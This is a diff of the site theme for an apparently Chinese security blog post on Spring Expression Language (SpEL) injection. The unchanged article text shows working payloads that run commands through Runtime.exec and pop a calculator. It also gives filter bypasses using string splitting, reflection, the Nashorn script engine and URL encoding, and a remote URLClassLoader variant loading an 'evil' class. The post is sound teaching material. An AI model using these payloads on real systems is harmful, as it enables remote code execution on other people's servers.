@@ -3,14 +3,28 @@
 <head>
   <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="theme-color" content="#f7f7f4">
-<meta name="color-scheme" content="light">
+<meta name="color-scheme" content="light dark">
+<meta name="theme-color" content="#f7f7f4" data-theme-color-light="#f7f7f4" data-theme-color-dark="#161614">
 
 <title>SPEL表达式注入 — CurlySean&#39;s Blog</title>
 <meta name="description" content="这里是 CurlySean 的个人技术博客，记录漏洞研究、代码审计与攻防实践，整理可以复现、验证与继续推演的技术细节。">
-<link rel="canonical" href="http://curlysean.github.io/2025/03/29/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">
+<link rel="canonical" href="https://curlysean.github.io/2025/03/29/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">
+<link rel="preload" href="/fonts/instrument-sans-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/jetbrains-mono-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
 <link rel="stylesheet" href="/css/style.css">
-<script>document.documentElement.classList.add('js')</script>
+<script>
+  (function () {
+    try {
+      var key = 'sheepfold-theme';
+      var saved = localStorage.getItem(key);
+      var dark = saved === 'dark' || (saved !== 'light' && window.matchMedia('(prefers-color-scheme: dark)').matches);
+      document.documentElement.setAttribute('data-theme', dark ? 'dark' : 'light');
+      document.documentElement.classList.add('js');
+    } catch (error) {
+      document.documentElement.classList.add('js');
+    }
+  })();
+</script>
 
 <meta name="generator" content="Hexo 7.3.0"></head>
 <body class="page-type-post">
@@ -37,11 +51,18 @@
         <a class="desktop-nav__link" href="/about/">关于</a>
       
     </nav>
-    <a class="header-cta" href="/archives/">开始阅读 <span aria-hidden="true">↗</span></a>
-    <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
-      <span class="sr-only">打开导航</span>
-      <span></span><span></span>
-    </button>
+    <div class="site-header__actions">
+      <button class="theme-toggle" type="button" data-theme-toggle aria-label="切换颜色模式" title="切换颜色模式">
+        <span data-theme-toggle-label>暗色</span>
+      </button>
+      
+        <a class="header-cta header-cta--ghost" href="/archives/">全部文章 <span aria-hidden="true">↗</span></a>
+      
+      <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
+        <span class="sr-only">打开导航</span>
+        <span></span><span></span>
+      </button>
+    </div>
   </div>
   <nav class="mobile-nav" id="mobile-menu" aria-label="移动端主导航" data-mobile-menu>
     <div class="frame mobile-nav__inner">
@@ -90,12 +111,6 @@
         
       </div>
     </div>
-    <div class="frame post-meta-grid reveal">
-      <div><span>发布</span><time datetime="2025-03-29T00:18:44.000Z">2025.03.29</time></div>
-      <div><span>更新</span><time datetime="2025-03-29T00:18:44.000Z">2025.03.29</time></div>
-      <div><span>阅读</span><strong>26 MIN</strong></div>
-      <div><span>标签</span><strong>1</strong></div>
-    </div>
   </header>
 
   <div class="frame post-content-layout">
@@ -103,13 +118,19 @@
       <div class="post-rail__inner">
         <p class="eyebrow">ON THIS PAGE</p>
         
-          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#IbVG0"><span class="toc-text">SPEL表达式注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RuxSh"><span class="toc-text">前置基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#v7p1e"><span class="toc-text">SPEL简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#I8qMI"><span class="toc-text">SPEL特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TmXL9"><span class="toc-text">SPEL类类型表达式T(Type)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ppdrd"><span class="toc-text">SPEL表达式用法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Q5jBl"><span class="toc-text">xml配置用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HXtQX"><span class="toc-text">注解@Value用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OmWfI"><span class="toc-text">Expression用法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cX58A"><span class="toc-text">步骤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#X5vQF"><span class="toc-text">Demo</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x0ioI"><span class="toc-text">SPEL表达式漏洞注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WsiFs"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sm9t8"><span class="toc-text">通过反射调用进行SpEL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TF3bm"><span class="toc-text">基础Poc与Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#xjOPg"><span class="toc-text">基础Poc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xcEpZ"><span class="toc-text">基础Bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#csoWt"><span class="toc-text">JavaScript Engine Bypass</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hZ0Qe"><span class="toc-text">利用类加载攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#oh6sk"><span class="toc-text">UrlClassloader</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#H1gIO"><span class="toc-text">AppClassLoader</span></a></li></ol></li></ol></li></ol></li></ol></nav>
+          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#RuxSh"><span class="toc-text">前置基础</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#v7p1e"><span class="toc-text">SPEL简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#I8qMI"><span class="toc-text">SPEL特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TmXL9"><span class="toc-text">SPEL类类型表达式T(Type)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ppdrd"><span class="toc-text">SPEL表达式用法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Q5jBl"><span class="toc-text">xml配置用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HXtQX"><span class="toc-text">注解@Value用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OmWfI"><span class="toc-text">Expression用法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cX58A"><span class="toc-text">步骤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#X5vQF"><span class="toc-text">Demo</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x0ioI"><span class="toc-text">SPEL表达式漏洞注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WsiFs"><span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sm9t8"><span class="toc-text">通过反射调用进行SpEL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TF3bm"><span class="toc-text">基础Poc与Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#xjOPg"><span class="toc-text">基础Poc</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xcEpZ"><span class="toc-text">基础Bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#csoWt"><span class="toc-text">JavaScript Engine Bypass</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hZ0Qe"><span class="toc-text">利用类加载攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#oh6sk"><span class="toc-text">UrlClassloader</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#H1gIO"><span class="toc-text">AppClassLoader</span></a></li></ol></li></ol></li></ol></nav>
         
       </div>
     </aside>
     <div class="article-column">
+      <div class="post-meta-grid reveal">
+        <div><span>发布</span><time datetime="2025-03-29T00:18:44.000Z">2025.03.29</time></div>
+        <div><span>更新</span><time datetime="2025-03-29T00:18:44.000Z">2025.03.29</time></div>
+        <div><span>阅读</span><strong>约 10 分钟</strong></div>
+        <div><span>标签</span><strong>1</strong></div>
+      </div>
       <div class="article-body">
-        <h1 id="IbVG0">SPEL表达式注入</h1>
+        
 <h2 id="RuxSh">前置基础</h2>
 <h3 id="v7p1e">SPEL简介</h3>
 在 Spring3 中引入了 Spring 表达式语言（Spring Expression Language，简称 SPEL），这是一种功能强大的表达式语言，支持在运行时查询和操作对象图，可以与基于 XML 和基于注解的 Spring 配置还有 bean 定义一起使用。 
@@ -139,7 +160,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Spel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">expression2</span> <span class="operator">=</span> <span class="string">&quot;T(java.lang.Runtime).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>;</span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();;</span><br><span class="line">        <span class="type">Expression</span> <span class="variable">result2</span> <span class="operator">=</span> parser.parseExpression(expression2);</span><br><span class="line">        System.out.println(result2.getValue(Class.class));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>用我的话来说就是，<code>T(Type)</code>中的东西，会被解析成一个<strong>完完整整的类</strong>，因此我们就可以通过<code>Runtime</code>类来执行命令</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740386369520-b57c09d4-1e3a-432b-ad79-8547a8034216.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740386369520-b57c09d4-1e3a-432b-ad79-8547a8034216.png" alt="SPEL表达式注入" loading="lazy"></p>
 <h2 id="Ppdrd">SPEL表达式用法</h2>
 
 <p>SpEL的用法有三种形式，一种是在注解当中<code>@Value</code>；一种是XML配置中；最后一种是在代码块中使用Expression</p>
@@ -155,7 +176,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setMessage</span><span class="params">(String message)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.message  = message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getMessage</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Your Message : &quot;</span> + message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>运行MainTestDemo.java文件后，首先会去demo.xml文件中加载xml中的配置。实际上，经过调试发现，在加载配置时，就会进行SpEL表达式的解析，从而触发我们的payload</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740388647211-f95a60c5-efaa-4a95-8383-9fee1c70ba5f.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740388647211-f95a60c5-efaa-4a95-8383-9fee1c70ba5f.png" alt="SPEL表达式注入" loading="lazy"></p>
 <h3 id="HXtQX">注解@Value用法</h3>
 示例用法如下
 
@@ -182,7 +203,7 @@ Expression用法分为四步：首先构造一个解析器，其次使用解析�
 <p>应用的示例如下，和xml配置的用法区别为：xml配置解析时，需要界定符<code>#&#123;&#125;</code>来注明SpEL表达式，而Expression用法，会将传入<code>parseExpression</code>方法的字符串直接当成SpEL表达式来解析，无需注明</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExpressionCalc</span> &#123;<span class="comment">// 字符串字面量  </span></span><br><span class="line">  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line"> <span class="comment">// 操作类弹计算器，当然java.lang包下的类是可以省略包名的  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">spel</span> <span class="operator">=</span> <span class="string">&quot;T(java.lang.Runtime).getRuntime().exec(\&quot;calc\&quot;)&quot;</span>;  </span><br><span class="line">        <span class="comment">// String spel = &quot;T(Runtime).getRuntime().exec(\&quot;calc\&quot;)&quot;;  </span></span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();  </span><br><span class="line">        <span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(spel);  </span><br><span class="line">        System.out.println(expression.getValue());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740389668647-8ce03781-c121-4c20-b046-3a55ff074b8f.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740389668647-8ce03781-c121-4c20-b046-3a55ff074b8f.png" alt="SPEL表达式注入" loading="lazy"></p>
 <h2 id="x0ioI">SPEL表达式漏洞注入</h2>
 <h3 id="WsiFs">漏洞原理</h3>
 
@@ -198,7 +219,7 @@ Expression用法分为四步：首先构造一个解析器，其次使用解析�
 <p><font style="color:rgb(80, 80, 92);">如下：</font></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BasicCalc</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">spel</span> <span class="operator">=</span> <span class="string">&quot;T(java.lang.Runtime).getRuntime().exec(\&quot;calc\&quot;)&quot;</span>;  </span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();  </span><br><span class="line">        <span class="type">Expression</span> <span class="variable">expression</span> <span class="operator">=</span> parser.parseExpression(spel);  </span><br><span class="line">        System.out.println(expression.getValue());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740395249483-171c088d-80f8-4f65-b64d-d16b4eae7309.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740395249483-171c088d-80f8-4f65-b64d-d16b4eae7309.png" alt="SPEL表达式注入" loading="lazy"></p>
 <h3 id="sm9t8">通过反射调用进行SpEL注入</h3>
 这里和我们上述所利用的方式是相类似的，只是多了一步反射调用
 
@@ -224,7 +245,7 @@ Expression用法分为四步：首先构造一个解析器，其次使用解析�
 
 <p>我们比较关注的是下面的js引擎名称</p>
 <p><font style="color:rgb(80, 80, 92);">故 </font><code>getEngineByName</code><font style="color:rgb(80, 80, 92);"> 的参数可以填 </font><code>[nashorn, Nashorn, js, JS, JavaScript, javascript, ECMAScript, ecmascript]</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740396153518-c8374c4d-4228-4cea-9817-3ccc39d164de.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740396153518-c8374c4d-4228-4cea-9817-3ccc39d164de.png" alt="SPEL表达式注入" loading="lazy"></p>
 <p>我们来举个例子看一下，其中<code>eval</code>方法就已经很明显可以执行代码</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ScriptEngineManager</span> <span class="variable">sem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>();</span><br><span class="line"><span class="type">ScriptEngine</span> <span class="variable">engine</span> <span class="operator">=</span> sem.getEngineByName(<span class="string">&quot;nashorn&quot;</span>);</span><br><span class="line">System.out.println(engine.eval(<span class="string">&quot;2+1&quot;</span>));</span><br></pre></td></tr></table></figure>
 
@@ -232,7 +253,7 @@ Expression用法分为四步：首先构造一个解析器，其次使用解析�
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JavaScript引擎通用PoC</span></span><br><span class="line">T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;nashorn&quot;</span>).eval(<span class="string">&quot;s=[3];s[0]=&#x27;cmd&#x27;;s[1]=&#x27;/C&#x27;;s[2]=&#x27;calc&#x27;;java.la&quot;</span>+<span class="string">&quot;ng.Run&quot;</span>+<span class="string">&quot;time.getRu&quot;</span>+<span class="string">&quot;ntime().ex&quot;</span>+<span class="string">&quot;ec(s);&quot;</span>)</span><br><span class="line"> </span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(<span class="string">&quot;xxx&quot;</span>),)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// JavaScript引擎+反射调用</span></span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;ex&quot;</span>+<span class="string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>).getMethod(<span class="string">&quot;getRu&quot;</span>+<span class="string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="string">&quot;java.l&quot;</span>+<span class="string">&quot;ang.Ru&quot;</span>+<span class="string">&quot;ntime&quot;</span>)),<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/C&quot;</span>,<span class="string">&quot;calc&quot;</span>&#125;)),)</span><br><span class="line"> </span><br><span class="line"><span class="comment">// JavaScript引擎+URL编码</span></span><br><span class="line"><span class="comment">// 其中URL编码内容为：</span></span><br><span class="line"><span class="comment">// 不加最后的getInputStream()也行，因为弹计算器不需要回显</span></span><br><span class="line">T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="string">&quot;JavaScript&quot;</span>).eval(T(java.net.URLDecoder).decode(<span class="string">&quot;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29&quot;</span>)),)</span><br></pre></td></tr></table></figure>
 
 <p>最后也是成功执行</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740396782521-63a383c6-e9ed-4110-b03a-14438ff3164b.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740396782521-63a383c6-e9ed-4110-b03a-14438ff3164b.png" alt="SPEL表达式注入" loading="lazy"></p>
 <h3 id="hZ0Qe">利用类加载攻击</h3>
 <h4 id="oh6sk"><font style="color:rgb(79, 79, 79);">UrlClassloader</font></h4>
 这个方法就是通过远程类加载
@@ -251,7 +272,7 @@ Expression用法分为四步：首先构造一个解析器，其次使用解析�
 
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">//String cmdStr = &quot;new java.net.URLClassLoader(new java.net.URL[]&#123;new java.net.URL(&#x27;http://127.0.0.1:8888/&#x27;)&#125;).loadClass(\&quot;evil\&quot;).getConstructors()[0].newInstance()&quot;;</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">cmdStr</span> <span class="operator">=</span> <span class="string">&quot;T(java.lang.ClassLoader).getSystemClassLoader().loadClass(&#x27;java.lang.Runtime&#x27;).getRuntime().exec(&#x27;calc&#x27;)&quot;</span>;</span><br><span class="line">        <span class="type">ExpressionParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SpelExpressionParser</span>();<span class="comment">//创建解析器</span></span><br><span class="line">        <span class="type">Expression</span> <span class="variable">exp</span> <span class="operator">=</span> parser.parseExpression(cmdStr);<span class="comment">//解析表达式</span></span><br><span class="line">        System.out.println( exp.getValue() );<span class="comment">//弹出计算器</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740399279702-bbb2fa4f-d226-45b7-bb69-31ed1bb972ea.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740399279702-bbb2fa4f-d226-45b7-bb69-31ed1bb972ea.png" alt="SPEL表达式注入" loading="lazy"></p>
 
       </div>
       
@@ -267,13 +288,13 @@ Expression用法分为四步：首先构造一个解析器，其次使用解析�
   <nav class="frame post-navigation" aria-label="相邻文章">
     
       <a href="/2025/04/01/C3P0%E9%93%BE/">
-        <span>← PREVIOUS</span>
+        <span>更新一篇</span>
         <strong>C3P0链</strong>
       </a>
     
     
-      <a href="/2025/03/25/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">
-        <span>NEXT →</span>
+      <a class="post-navigation__older" href="/2025/03/25/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">
+        <span>更早一篇</span>
         <strong>EL表达式注入</strong>
       </a>
     
@@ -287,9 +308,9 @@ Expression用法分为四步：首先构造一个解析器，其次使用解析�
       <a href="/">CURLYSEAN</a>
       <span>持续记录，保持验证。</span>
     </div>
-    <p class="site-footer__copyright">© 2026 CurlySean</p>
+    <p class="site-footer__copyright">© 2025–2026 CurlySean</p>
     <nav class="site-footer__links" aria-label="外部链接">
-      <a href="https://github.com/CurlySean" target="_blank" rel="noopener">GitHub ↗</a>
+      <a href="https://github.com/CurlySean" target="_blank" rel="noopener noreferrer">GitHub ↗</a>
       <a href="mailto:5345414e@gmail.com">Email ↗</a>
     </nav>
   </div>
